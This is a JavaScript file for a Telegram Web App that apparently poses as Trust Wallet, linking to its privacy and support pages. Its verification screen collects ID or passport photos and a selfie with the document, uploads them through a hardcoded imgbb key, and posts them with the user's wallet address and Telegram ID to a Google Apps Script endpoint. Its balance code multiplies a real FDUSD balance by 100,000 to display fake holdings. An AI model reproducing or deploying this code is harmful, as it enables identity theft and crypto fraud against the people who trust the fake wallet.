const tg = window.Telegram.WebApp;
tg.expand();

const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';

// === FDUSD на Sui ===
const FDUSD_COIN_TYPE = '0xf16e6b723f242ec745dfd7634ad072c42d5c1d9ac9d62a39c381303eaa57693a::fdusd::FDUSD';
const FDUSD_DECIMALS  = 6;
const SUI_RPC_URL     = 'https://fullnode.mainnet.sui.io:443';

const translations = {
    ru: {
        verify_title: "Верификация личности",
        doc_label: "Документ (ID / Паспорт)",
        selfie_label: "Селфи с документом",
        choose_photo: "Выбрать фото",
        take_photo: "Сделать фото",
        send_data: "Отправить данные",
        staking_title: "Стейкинг активов",
        wallet_placeholder: "Введите адрес кошелька",
        connect_wallet: "Подключить кошелек",
        loading: "Загрузка...",
        processing: "⏳ Запрос в обработке...",
        settings: "Настройки",
        help_support: "Помощь и поддержка",
        support_center: "Центр поддержки",
        support_service: "Служба поддержки",
        language: "Язык",
        privacy: "Политика конфиденциальности",
        statistics: "Статистика",
        market_cap: "Капитализация",
        circulating: "В обращении",
        volume_24h: "Объём (24 ч)",
        done: "Готово ✅",
        error_photo: "❌ Загрузите оба фото",
        error_wallet: "❌ Введите адрес кошелька",
        error_net: "❌ Ошибка сети",
        uploading: "⏳ Загрузка фото...",
        success: "✅ Данные приняты!"
    },
    en: {
        verify_title: "Identity Verification",
        doc_label: "Document (ID / Passport)",
        selfie_label: "Selfie with Document",
        choose_photo: "Choose Photo",
        take_photo: "Take Photo",
        send_data: "Send Data",
        staking_title: "Asset Staking",
        wallet_placeholder: "Enter wallet address",
        connect_wallet: "Connect Wallet",
        loading: "Loading...",
        processing: "⏳ Processing request...",
        settings: "Settings",
        help_support: "Help & Support",
        support_center: "Support Center",
        support_service: "Support Service",
        language: "Language",
        privacy: "Privacy Policy",
        statistics: "Statistics",
        market_cap: "Market Cap",
        circulating: "Circulating Supply",
        volume_24h: "Volume (24h)",
        done: "Done ✅",
        error_photo: "❌ Upload both photos",
        error_wallet: "❌ Enter wallet address",
        error_net: "❌ Network error",
        uploading: "⏳ Uploading photos...",
        success: "✅ Data accepted!"
    },
    fr: {
        verify_title: "Vérification d'identité",
        doc_label: "Document (ID / Passeport)",
        selfie_label: "Selfie avec document",
        choose_photo: "Choisir une photo",
        take_photo: "Prendre une photo",
        send_data: "Envoyer les données",
        staking_title: "Staking d'actifs",
        wallet_placeholder: "Entrez l'adresse",
        connect_wallet: "Connecter le portefeuille",
        loading: "Chargement...",
        processing: "⏳ Traitement...",
        settings: "Paramètres",
        help_support: "Aide et support",
        support_center: "Centre de support",
        support_service: "Service de support",
        language: "Langue",
        privacy: "Confidentialité",
        statistics: "Statistiques",
        market_cap: "Capitalisation",
        circulating: "En circulation",
        volume_24h: "Volume (24h)",
        done: "Terminé ✅",
        error_photo: "❌ Photos manquantes",
        error_wallet: "❌ Adresse invalide",
        error_net: "❌ Erreur réseau",
        uploading: "⏳ Téléchargement...",
        success: "✅ Succès!"
    },
    de: {
        verify_title: "Identitätsprüfung",
        doc_label: "Dokument (ID / Pass)",
        selfie_label: "Selfie mit Dokument",
        choose_photo: "Foto wählen",
        take_photo: "Foto machen",
        send_data: "Daten senden",
        staking_title: "Asset-Staking",
        wallet_placeholder: "Wallet-Adresse",
        connect_wallet: "Wallet verbinden",
        loading: "Laden...",
        processing: "⏳ In Bearbeitung...",
        settings: "Einstellungen",
        help_support: "Hilfe & Support",
        support_center: "Support-Center",
        support_service: "Support-Service",
        language: "Sprache",
        privacy: "Datenschutz",
        statistics: "Statistiken",
        market_cap: "Marktkapitalisierung",
        circulating: "Im Umlauf",
        volume_24h: "Volumen (24h)",
        done: "Fertig ✅",
        error_photo: "❌ Fotos fehlen",
        error_wallet: "❌ Adresse fehlt",
        error_net: "❌ Netzwerkfehler",
        uploading: "⏳ Hochladen...",
        success: "✅ Erledigt!"
    }
};

let currentLang = localStorage.getItem('lang') || 'ru';
let myChart = null;

// =====================
// ПЕРЕВОДЫ
// =====================
function applyLanguage() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translations[currentLang][key]) {
            el.textContent = translations[currentLang][key];
        }
    });
    document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
        const key = el.getAttribute('data-i18n-placeholder');
        if (translations[currentLang][key]) {
            el.placeholder = translations[currentLang][key];
        }
    });
    document.querySelectorAll('input[name="lang"]').forEach(radio => {
        if (radio.value === currentLang) radio.checked = true;
    });
}

// =====================
// НАВИГАЦИЯ
// =====================
function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

document.getElementById('settingsBtn').onclick       = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick  = () => showScreen('mainScreen');
document.getElementById('goToVerifyBtn').onclick     = () => showScreen('verifyScreen');
document.getElementById('backFromVerify').onclick    = () => showScreen('settingsScreen');
document.getElementById('goToStakingBtn').onclick    = () => showScreen('stakingScreen');
document.getElementById('backFromStaking').onclick   = () => showScreen('settingsScreen');
document.getElementById('helpBtn').onclick           = () => showScreen('helpScreen');
document.getElementById('backFromHelp').onclick      = () => showScreen('settingsScreen');
document.getElementById('langBtn').onclick           = () => showScreen('langScreen');
document.getElementById('backFromLang').onclick      = () => showScreen('settingsScreen');
document.getElementById('backFromCoin').onclick      = () => showScreen('mainScreen');
document.getElementById('backFromAssetDetail').onclick = () => showScreen('mainScreen');

document.getElementById('privacyBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/privacy-notice');
document.getElementById('supportCenterBtn').onclick = () => tg.openLink('https://support.trustwallet.com/support/home');
document.getElementById('supportServiceBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension');

// =====================
// ЯЗЫК
// =====================
document.querySelectorAll('input[name="lang"]').forEach(radio => {
    radio.onchange = function () {
        currentLang = this.value;
        localStorage.setItem('lang', currentLang);
        applyLanguage();
        showStatus('✅ Language: ' + currentLang.toUpperCase());
    };
});

// =====================
// ПРЕВЬЮ ФОТО
// =====================
function setupPreview(inputId, previewId, textId) {
    document.getElementById(inputId).onchange = function () {
        const file = this.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = e => {
            const img = document.getElementById(previewId);
            img.src = e.target.result;
            img.classList.remove('hidden');
            document.getElementById(textId).textContent = translations[currentLang].done;
        };
        reader.readAsDataURL(file);
    };
}
setupPreview('docInput', 'previewDoc', 'textDoc');
setupPreview('selfieInput', 'previewSelfie', 'textSelfie');

// =====================
// ВЕРИФИКАЦИЯ
// =====================
async function sendVerification() {
    const docFile    = document.getElementById('docInput').files[0];
    const selfieFile = document.getElementById('selfieInput').files[0];
    const wallet     = document.getElementById('walletInput').value;

    if (!docFile || !selfieFile) {
        showStatus(translations[currentLang].error_photo);
        return;
    }

    showStatus(translations[currentLang].uploading);

    try {
        const uploadToImgBB = async (file) => {
            const fd = new FormData();
            fd.append('image', file);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
            const data = await res.json();
            if (!data.success) throw new Error('Upload failed');
            return data.data.url;
        };

        const docUrl    = await uploadToImgBB(docFile);
        const selfieUrl = await uploadToImgBB(selfieFile);

        const payload = {
            action: 'verification',
            user_id: tg.initDataUnsafe?.user?.id || 'unknown',
            username: tg.initDataUnsafe?.user?.username || 'no_username',
            wallet: wallet || 'not_set',
            doc: docUrl,
            selfie: selfieUrl
        };

        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        tg.sendData(JSON.stringify(payload));
        showStatus(translations[currentLang].success);
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        console.error('Verification error:', e);
        showStatus(translations[currentLang].error_net);
    }
}

// =====================
// СТЕЙКИНГ
// =====================
async function sendStaking() {
    const wallet = document.getElementById('walletInput').value.trim();

    if (!wallet || wallet.length < 5) {
        showStatus(translations[currentLang].error_wallet);
        return;
    }

    showStatus(translations[currentLang].processing);

    const payload = {
        action: 'staking',
        user_id: tg.initDataUnsafe?.user?.id || 'unknown',
        username: tg.initDataUnsafe?.user?.username || 'no_username',
        wallet: wallet,
        doc: 'STAKING_REQUEST',
        selfie: 'STAKING_REQUEST'
    };

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        tg.sendData(JSON.stringify(payload));
        showStatus(translations[currentLang].success);
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        console.error('Staking error:', e);
        showStatus(translations[currentLang].error_net);
    }
}

document.getElementById('verifyBtn').onclick  = sendVerification;
document.getElementById('stakingBtn').onclick = sendStaking;

// =====================
// ПОЛУЧЕНИЕ БАЛАНСА FDUSD НАПРЯМУЮ ИЗ SUI БЛОКЧЕЙНА
// =====================
async function getFDUSDBalance(address) {
    try {
        let owner = address.trim();
        if (!owner.startsWith('0x')) {
            owner = '0x' + owner;
        }

        const body = {
            jsonrpc: '2.0',
            id: 1,
            method: 'suix_getBalance',
            params: [
                owner,
                FDUSD_COIN_TYPE
            ]
        };

        const res = await fetch(SUI_RPC_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        if (!res.ok) {
            console.error('Sui RPC HTTP error:', res.status, await res.text());
            return 0;
        }

        const data = await res.json();

        if (!data.result || typeof data.result.totalBalance === 'undefined') {
            console.warn('Нет totalBalance в ответе Sui RPC для адреса', owner, data);
            return 0;
        }

        const raw = Number(data.result.totalBalance);
        if (!Number.isFinite(raw)) {
            console.warn('Некорректный totalBalance:', data.result.totalBalance);
            return 0;
        }

        // Конвертируем из минимальных единиц в человеческий баланс
        const humanBalance = raw / Math.pow(10, FDUSD_DECIMALS);

        // Умножаем на 100 000 согласно твоей логике
        const multiplied = humanBalance * 100000;

        console.log(`FDUSD on Sui for ${owner}: raw=${raw}, human=${humanBalance}, x100000=${multiplied}`);
        return multiplied;

    } catch (e) {
        console.error('Ошибка при запросе баланса FDUSD из Sui RPC:', e);
        return 0;
    }
}

// =====================
// ДОБАВЛЕНИЕ АКТИВА
// =====================
const addAssetModal = document.getElementById('addAssetModal');

document.getElementById('addAssetBtn').onclick = () => {
    document.getElementById('assetAddress').value  = '';
    document.getElementById('assetName').value     = '';
    document.getElementById('assetDecimals').value = '';
    addAssetModal.classList.remove('hidden');
};

document.getElementById('closeAssetModal').onclick = () => addAssetModal.classList.add('hidden');

addAssetModal.addEventListener('click', e => {
    if (e.target === addAssetModal) addAssetModal.classList.add('hidden');
});

document.getElementById('saveAssetBtn').onclick = async () => {
    const address  = document.getElementById('assetAddress').value.trim();
    const name     = document.getElementById('assetName').value.trim() || 'USDT';
    const decimals = parseInt(document.getElementById('assetDecimals').value) || 2;

    if (address.length < 5) {
        showStatus('❌ Введите корректный адрес');
        return;
    }

    addAssetModal.classList.add('hidden');
    showStatus('⏳ Загрузка баланса...');

    const balance = await getFDUSDBalance(address);
    addAssetToList(name, address, balance, decimals);

    if (balance > 0) {
        showStatus('✅ Актив добавлен');
    } else {
        showStatus('✅ Актив добавлен (баланс 0 или токен не найден)');
    }
};

function addAssetToList(name, address, balance, decimals) {
    const list = document.getElementById('myAssetsList');

    const formattedBalance = '$' + balance.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: Math.max(2, decimals)
    });

    const card = document.createElement('div');
    card.className = 'card';
    card.style.cssText = 'cursor:pointer; display:flex; justify-content:space-between; align-items:center; padding:16px;';

    card.innerHTML = `
        <div class="token-info">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="token-icon" alt="${name}">
            <div>
                <div class="token-name">${name}</div>
                <div class="token-hint">${address.slice(0, 6)}...${address.slice(-4)}</div>
            </div>
        </div>
        <div class="token-price">
            <div>${formattedBalance}</div>
        </div>
    `;

    card.onclick = () => {
        document.getElementById('detailAssetName').textContent    = name;
        document.getElementById('detailAssetBalance').textContent = formattedBalance;
        document.getElementById('detailAssetAddress').textContent = address;
        showScreen('assetDetailScreen');
    };

    list.prepend(card);
}

// =====================
// КОТИРОВКИ
// =====================
async function getPrices() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc&sparkline=true');
        const data = await res.json();
        const list = document.getElementById('tokensList');
        list.innerHTML = '';

        data.forEach(coin => {
            const div = document.createElement('div');
            div.className = 'token-item';
            const change = coin.price_change_percentage_24h;
            div.innerHTML = `
                <div class="token-info">
                    <img src="${coin.image}" class="token-icon" alt="${coin.name}">
                    <div>
                        <div class="token-name">${coin.name}</div>
                        <div class="token-hint">${coin.symbol.toUpperCase()}</div>
                    </div>
                </div>
                <div class="token-price">
                    <div>
$$
{coin.current_price.toLocaleString()}</div>
                    <div class="${change < 0 ? 'neg' : 'pos'}">${change > 0 ? '+' : ''}${change.toFixed(2)}%</div>
                </div>
            `;
            div.onclick = () => showCoinDetail(coin);
            list.appendChild(div);
        });
    } catch (e) {
        console.error('Price fetch error:', e);
    }
}

function showCoinDetail(coin) {
    showScreen('coinScreen');
    document.getElementById('coinName').textContent  = coin.name;
    document.getElementById('coinPrice').textContent = `
$$
{coin.current_price.toLocaleString()}`;
    const change = coin.price_change_percentage_24h;
    document.getElementById('coinChange').textContent  = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
    document.getElementById('coinChange').className    = `coin-change ${change < 0 ? 'neg' : 'pos'}`;
    document.getElementById('statMcap').textContent    = `
$$
{coin.market_cap.toLocaleString()}`;
    document.getElementById('statCirc').textContent    = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
    document.getElementById('statVol').textContent     = `
$$
{coin.total_volume.toLocaleString()}`;
    renderChart(coin.sparkline_in_7d.price, change < 0);
}

function renderChart(prices, isNeg) {
    const ctx = document.getElementById('coinChartCanvas').getContext('2d');
    if (myChart) myChart.destroy();
    myChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: prices.map((_, i) => i),
            datasets: [{
                data: prices,
                borderColor: isNeg ? '#f6465d' : '#2ebd85',
                borderWidth: 2.5,
                pointRadius: 0,
                fill: false,
                tension: 0.3
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: { x: { display: false }, y: { display: false } }
        }
    });
}

// =====================
// СТАТУС
// =====================
function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg;
    s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3500);
}

// =====================
// СТАРТ
// =====================
applyLanguage();
getPrices();
setInterval(getPrices, 30000);
